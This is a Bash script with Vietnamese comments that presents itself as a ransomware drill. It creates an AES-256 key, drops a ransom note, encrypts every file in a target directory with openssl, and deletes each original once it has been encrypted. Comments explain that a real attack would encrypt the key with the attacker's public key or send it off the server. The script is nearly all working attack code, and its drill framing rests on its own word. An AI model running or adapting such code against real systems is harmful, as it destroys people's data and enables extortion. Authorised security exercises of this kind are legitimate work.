#!/bin/bash

# --- CẤU HÌNH ---
# !!! THAY ĐỔI ĐƯỜNG DẪN NÀY CHO PHÙ HỢP VỚI MÔI TRƯỜNG THỬ NGHIỆM CỦA BẠN !!!
TARGET_DIR="/home/namtn/encrypt" # Thư mục chứa file cần mã hóa
# TARGET_DIR="/var/www/html/data_test" # Ví dụ khác

RANSOM_NOTE_FILENAME="!!!_FILES_ENCRYPTED_READ_ME_!!!.txt"
KEY_FILENAME="secret_key_dont_lose_it.key"
ENCRYPTED_EXTENSION=".locked" # Phần mở rộng cho file đã mã hóa
LOG_FILE="/tmp/ransom_activity.log" # Ghi lại hoạt động (tùy chọn)

# --- HÀM GHI LOG (TÙY CHỌN) ---
log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# --- KIỂM TRA THƯ MỤC TARGET ---
if [ ! -d "$TARGET_DIR" ]; then
    log_message "LỖI: Thư mục target '$TARGET_DIR' không tồn tại. Thoát."
    echo "LỖI: Thư mục target '$TARGET_DIR' không tồn tại. Thoát." >&2
    exit 1
fi
log_message "Bắt đầu thực thi payload mã hóa trên '$TARGET_DIR'."

# --- 1. TẠO KEY MÃ HÓA NGẪU NHIÊN ---
# Sử dụng openssl để tạo key đủ mạnh (AES-256 bit)
ENCRYPTION_KEY=$(openssl rand -hex 32)
if [ -z "$ENCRYPTION_KEY" ]; then
    log_message "LỖI: Không thể tạo key mã hóa. Thoát."
    echo "LỖI: Không thể tạo key mã hóa. Thoát." >&2
    exit 1
fi
log_message "Key mã hóa đã được tạo."

# --- 2. LƯU KEY GIẢI MÃ VÀO FILE ---
# File key này sẽ được gửi về PC hoặc PC tự lấy
# QUAN TRỌNG: Trong kịch bản thực tế, key này sẽ được mã hóa bằng public key của kẻ tấn công
# hoặc gửi đi ngay lập tức và xóa khỏi server.
# Ở đây, chúng ta lưu nó tạm thời vào thư mục target để PC có thể lấy.
# CÂN NHẮC: Lưu key ở một nơi an toàn hơn, ví dụ /tmp hoặc thư mục home của user chạy script,
# trước khi PC lấy nó đi. Ở đây, để đơn giản, ta đặt trong TARGET_DIR.
KEY_FILE_PATH="$TARGET_DIR/$KEY_FILENAME"
echo "$ENCRYPTION_KEY" > "$KEY_FILE_PATH"
chmod 600 "$KEY_FILE_PATH" # Chỉ chủ sở hữu mới đọc/ghi được
log_message "Key giải mã đã được lưu vào '$KEY_FILE_PATH'."

# --- 3. TẠO FILE TEXT CẢNH BÁO (RANSOM NOTE) ---
RANSOM_NOTE_PATH="$TARGET_DIR/$RANSOM_NOTE_FILENAME"
cat << EOF > "$RANSOM_NOTE_PATH"
!!! CẢNH BÁO QUAN TRỌNG !!!

Tất cả các file quan trọng của bạn trong thư mục $TARGET_DIR đã bị MÃ HÓA.
Để khôi phục lại file, bạn cần key giải mã duy nhất.

Đây là một phần của DIỄN TẬP RANSOMWARE.
Nếu đây là tình huống thực, bạn sẽ được yêu cầu trả tiền chuộc.

Thông tin kỹ thuật (cho diễn tập):
- Key giải mã được lưu tại: (Sẽ bị xóa sau khi gửi về PC)
- Các file đã bị mã hóa bằng thuật toán AES-256-CBC.

Vui lòng báo cáo sự cố này cho đội ngũ IT/Security của bạn ngay lập tức.
EOF
log_message "File cảnh báo đã được tạo tại '$RANSOM_NOTE_PATH'."

# --- 4. MÃ HÓA FILE TRONG THƯ MỤC CHỈ ĐỊNH ---
# Sử dụng openssl để mã hóa đối xứng (AES-256-CBC)
# Cảnh báo: Lệnh `rm` sẽ xóa file gốc sau khi mã hóa. CẨN THẬN!
log_message "Bắt đầu quá trình mã hóa file..."
find "$TARGET_DIR" -type f -not -name "$RANSOM_NOTE_FILENAME" -not -name "$KEY_FILENAME" -not -name "$(basename "$0")" | while read FILE; do
    # Tạo tên file mã hóa
    ENCRYPTED_FILE="${FILE}${ENCRYPTED_EXTENSION}"

    # Mã hóa file bằng openssl, sử dụng key đã tạo
    # -pbkdf2 và -iter được thêm vào để tăng cường bảo mật cho key derivation
    openssl enc -aes-256-cbc -pbkdf2 -iter 10000 -salt -in "$FILE" -out "$ENCRYPTED_FILE" -k "$ENCRYPTION_KEY"
    
    if [ $? -eq 0 ]; then
        # Xóa file gốc NẾU mã hóa thành công
        rm "$FILE"
        log_message "Đã mã hóa: '$FILE' -> '$ENCRYPTED_FILE' và xóa file gốc."
    else
        log_message "LỖI: Mã hóa file '$FILE' thất bại."
        echo "LỖI: Mã hóa file '$FILE' thất bại." >&2
    fi
done
log_message "Hoàn tất quá trình mã hóa file."

# --- 5. GỬI KEY GIẢI MÃ VỀ PC HOẶC PC TỰ LẤY ---
# Bước này sẽ được thực hiện bởi PC Windows (dùng scp để lấy file key)
# Script này chỉ cần đảm bảo file key tồn tại và có thể truy cập (cho đến khi PC lấy và xóa nó).
# Ví dụ: PC Windows sẽ chạy: scp user@linux_server:$KEY_FILE_PATH C:\path\to\local\folder\
log_message "Payload mã hóa hoàn tất. File key '$KEY_FILENAME' sẵn sàng để PC lấy."
log_message "Đường dẫn đầy đủ của file key trên server: $KEY_FILE_PATH"

echo "Diễn tập mã hóa hoàn tất trên server."
echo "File key giải mã là: $KEY_FILENAME (được lưu trong $TARGET_DIR)"
echo "File cảnh báo là: $RANSOM_NOTE_FILENAME (được lưu trong $TARGET_DIR)"

exit 0
